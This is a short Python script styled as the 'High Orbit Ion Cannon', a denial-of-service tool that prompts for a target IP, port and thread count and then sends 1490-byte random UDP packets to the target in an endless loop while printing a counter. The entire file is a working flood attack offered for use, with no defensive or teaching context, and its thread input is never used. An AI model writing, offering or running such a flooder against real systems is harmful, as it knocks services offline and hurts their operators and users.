import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
print (" _   _        ___        ___        ____  ")
print ("| | | |      / _ \      |_ _|      / ___| ")
print ("| |_| |     | | | |      | |      | | ")   
print ("|  _  |  _  | |_| |  _   | |   _  | |___ ")
print ("|_| |_| (_)  \___/  (_) |___| (_)  \____|")
print (" ")                                         
print ("HIGH DRBIT ION CANNON ")
print ("Truth is on the side of the oppressed.")
print (" ")
print ("HIGH ORBIT IOB CANNON STANDING BY")
print (" ")
print ("FIRE TEE LAZER")
print (" ")
print (" ")
ip = input(" IP : ")
port = int(input("443/80 : "))
num_threads = int(input(" THREADS: "))

sd = 10000
print (" ")

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("OUTPUT %s KB %s TARGBTS %d"%(sent,ip,port))
     time.sleep((10000-sd)/200000)
     
